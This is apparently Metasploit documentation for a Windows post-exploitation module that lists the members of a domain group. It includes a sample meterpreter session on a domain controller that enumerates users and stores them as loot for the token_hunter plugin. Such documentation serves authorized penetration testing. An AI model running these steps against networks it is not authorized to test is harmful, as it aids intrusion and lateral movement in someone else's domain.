## Vulnerable Application

This module extracts user accounts from the specified domain group
and stores the results in the loot. It will also verify if session
account is in the group. Data is stored in loot in a format that
is compatible with the `token_hunter` plugin. This module must be
run on a session running as a domain user.

## Verification Steps

1. Start msfconsole
1. Get a session on a Windows target which is joined to a domain
1. Do: `use post/windows/gather/enum_domain_group_users`
1. Do: `set session [#]`
1. Do: `set group [group]`
1. Do: `run`
1. You should get the domain members for the group.

## Options

### Group

The group to enumerate.

## Scenarios

### Windows 2012 DC

```
msf6 post(windows/gather/enum_domain_group_users) > use post/windows/gather/enum_domain_group_users 
msf6 post(windows/gather/enum_domain_group_users) > sessions -i 6
[*] Starting interaction with 6...

meterpreter > sysinfo
Computer        : DC1
OS              : Windows 2012 (6.2 Build 9200).
Architecture    : x64
System Language : en_US
Domain          : hoodiecola
Logged On Users : 4
Meterpreter     : x86/windows
meterpreter > background
[*] Backgrounding session 6...
msf6 post(windows/gather/enum_domain_group_users) > set session 6
session => 6
msf6 post(windows/gather/enum_domain_group_users) > set group finance
group => finance
msf6 post(windows/gather/enum_domain_group_users) > run

[*] Running module against DC1
[-] Post aborted due to failure: unknown: No members found for 'hoodiecola\finance' group.
[*] Post module execution completed
msf6 post(windows/gather/enum_domain_group_users) > set group "quality control"
group => quality control
msf6 post(windows/gather/enum_domain_group_users) > run

[*] Running module against DC1 (1.1.1.1)
[*] Found 3 users in 'hoodiecola\quality control' group.
[*]     hoodiecola\rachel
[*]     hoodiecola\lisa
[*]     hoodiecola\charles
[*] Current session running as NT AUTHORITY\SYSTEM is not a member of quality control
[+] User list stored in /root/.msf4/loot/20201011184812_default_1.1.1.1_domain.group.mem_339475.txt
[*] Post module execution completed
```
